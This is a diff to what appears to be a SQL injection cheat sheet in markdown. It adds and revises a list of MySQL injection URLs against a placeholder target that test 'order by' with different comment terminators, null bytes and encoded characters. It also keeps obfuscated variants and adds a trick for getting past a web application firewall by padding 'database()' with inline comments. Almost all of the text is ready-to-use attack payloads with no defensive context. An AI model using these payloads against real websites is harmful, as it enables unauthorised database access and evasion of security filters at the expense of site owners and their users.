@@ -1,12 +1,20 @@
 ## Stabilise the error message
 Whenever the website keeps showing up erros on MySQL syntax, it is required to enter queries to fix the error. This usually happens when server doesn't accept ```-- -``` inside the queries. 
 
-```http://domain.com/index.php?id=1' order by 1;%00-- -```   no error  
-```http://domain.com/index.php?id=1' order by 1;%60-- - ```  no error  
-```http://domain.com/index.php?id=1' order by 1%23-- - ```  no error  
-```http://domain.com/index.php?id=1' order by 1%60-- - ```  no error  
-```http://domain.com/index.php?id=1'%23/* order by 1-- - ```  no error  
-```http://domain.com/index.php?id=1') order by 1-- - ```  no error  
+```http://domain.com/index.php?id=1' order by 1)--```   
+```http://domain.com/index.php?id=1' order by 1))--```  
+```http://domain.com/index.php?id=1' order by 1;%00```     
+```http://domain.com/index.php?id=1' order by 1));%00```   
+```http://domain.com/index.php?id=1' order by 1;%60```    
+```http://domain.com/index.php?id=1' order by 1%23```    
+```http://domain.com/index.php?id=1' order by 1%60```    
+```http://domain.com/index.php?id=1' order by 1%90```   
+```http://domain.com/index.php?id=1'%23/* order by 1```  
+```http://domain.com/index.php?id=1') order by 1```  
+```http://domain.com/index.php?id=1' order by 1") ;%00```  
+```http://domain.com/index.php?id=1' order by 1#--+```  
+```http://domain.com/index.php?id=1' order by 1'))%23``` 
+
 
 If MySQL Syntax Error still persists, simply try again the payloads, but this time, without ```-- -```
 
@@ -31,3 +39,8 @@ with
 or with  
 ```http://domain.com/index.php?id=1'%23nuLL%0Aorder%23nuLL%0Aby%23nuLL%0A1--%23nuLL%0A-```  
 and so on...
+
+
+## WAF blocks retrieving information from database()
+
+Simply replace ```database()``` with ```database/*badd*//**/()```
